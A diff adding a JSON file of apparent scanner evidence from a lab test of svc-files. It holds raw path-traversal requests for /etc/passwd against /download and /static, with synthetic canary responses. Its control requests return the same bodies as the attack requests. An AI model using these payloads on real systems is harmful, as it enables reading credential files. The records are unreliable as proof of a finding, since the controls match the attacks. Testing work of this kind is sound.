@@ -1,0 +1,102 @@
+[
+ {
+  "ev_id": "EV-r27-0025-A1",
+  "finding_key": "svc-files/download+wstg-inpv-lfi",
+  "raw_request": "GET /download?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "59"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>",
+  "matcher_words": [
+   "root:x:0",
+   "GTTRAVERSAL-01"
+  ]
+ },
+ {
+  "ev_id": "EV-r27-0025-A2",
+  "finding_key": "svc-files/download+wstg-inpv-lfi",
+  "raw_request": "GET /download?path=%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "59"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>",
+  "matcher_words": [
+   "root:x:0",
+   "GTTRAVERSAL-01"
+  ]
+ },
+ {
+  "ev_id": "EV-r27-0025-C1",
+  "finding_key": "svc-files/download+wstg-inpv-lfi:control",
+  "raw_request": "GET /download HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:15 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "59"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>",
+  "matcher_words": [
+   "root:x:0"
+  ]
+ },
+ {
+  "ev_id": "EV-r27-0025-B1",
+  "finding_key": "svc-files/static+wstg-inpv-lfi",
+  "raw_request": "GET /static?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "63"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-02 synthetic file: shadow file content</html>",
+  "matcher_words": [
+   "GTTRAVERSAL-02",
+   "shadow file content"
+  ]
+ },
+ {
+  "ev_id": "EV-r27-0025-B2",
+  "finding_key": "svc-files/static+wstg-inpv-lfi",
+  "raw_request": "GET /static?path=%2Fetc%2Fpasswd HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:23 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "63"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-02 synthetic file: shadow file content</html>",
+  "matcher_words": [
+   "GTTRAVERSAL-02",
+   "shadow file content"
+  ]
+ },
+ {
+  "ev_id": "EV-r27-0025-C2",
+  "finding_key": "svc-files/static+wstg-inpv-lfi:control",
+  "raw_request": "GET /static HTTP/1.1\r\nHost: svc-files:8008\r\nConnection: close\r\n\r\n",
+  "resp_status": 200,
+  "resp_headers": {
+   "Server": "BaseHTTP/0.6 Python/3.12.14",
+   "Date": "Fri, 09 Oct 2026 15:36:16 GMT",
+   "Content-Type": "text/html; charset=utf-8",
+   "Content-Length": "63"
+  },
+  "resp_body_excerpt": "<html>GTTRAVERSAL-02 synthetic file: shadow file content</html>",
+  "matcher_words": [
+   "GTTRAVERSAL-02"
+  ]
+ }
+]
